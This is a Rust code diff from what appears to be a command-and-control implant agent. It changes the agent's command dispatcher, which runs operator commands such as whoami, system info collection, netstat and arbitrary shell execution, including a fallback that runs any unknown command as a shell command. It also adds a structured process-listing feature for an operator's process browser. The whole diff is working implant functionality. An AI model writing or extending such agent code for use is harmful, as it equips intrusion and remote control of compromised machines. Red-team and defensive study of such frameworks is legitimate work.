@@ -76,24 +76,59 @@ pub fn link_loop() {
 
 // ── Command dispatch ─────────────────────────────────────────────────────────
 
-fn dispatch(command: &str, parameters: &str) -> String {
+fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
     if let Some(output) = dispatch_common(command, parameters) {
         return output;
     }
 
     match command {
-        "whoami" => format!("{}@{}", username(), hostname()),
-        "info" => collect_system_info(),
-        "ps" => shell_exec("ps aux"),
-        "netstat" => shell_exec("netstat -an"),
+        "whoami" => format!("{}@{}", username(), hostname()).into(),
+        "info" => collect_system_info().into(),
+        "ps" => list_processes_browser(),
+        "netstat" => shell_exec("netstat -an").into(),
         "shell" => {
             let cmd = link_common::extract_param(parameters, "command");
-            shell_exec(if cmd.is_empty() { parameters } else { &cmd })
+            shell_exec(if cmd.is_empty() { parameters } else { &cmd }).into()
         }
         _ => {
             let cmd = link_common::extract_param(parameters, "command");
-            shell_exec(if cmd.is_empty() { parameters } else { &cmd })
+            shell_exec(if cmd.is_empty() { parameters } else { &cmd }).into()
         }
+    }
+}
+
+fn list_processes_browser() -> link_common::CommandOutput {
+    let raw = shell_exec("ps -eo pid,ppid,user,comm");
+    let mut entries = Vec::new();
+
+    for line in raw.lines().skip(1) {
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.len() < 4 {
+            continue;
+        }
+        let pid: u32 = parts[0].parse().unwrap_or(0);
+        let ppid: u32 = parts[1].parse().unwrap_or(0);
+        let user = parts[2].to_string();
+        let name = parts[3..].join(" ");
+        entries.push(link_common::ProcessEntry {
+            process_id: pid,
+            name: name.clone(),
+            parent_process_id: ppid,
+            user: Some(user),
+            command_line: Some(name),
+            bin_path: None,
+            architecture: None,
+        });
+    }
+
+    if entries.is_empty() {
+        return raw.into();
+    }
+
+    link_common::CommandOutput {
+        text: raw,
+        processes: Some(entries),
+        file_browser: None,
     }
 }
 
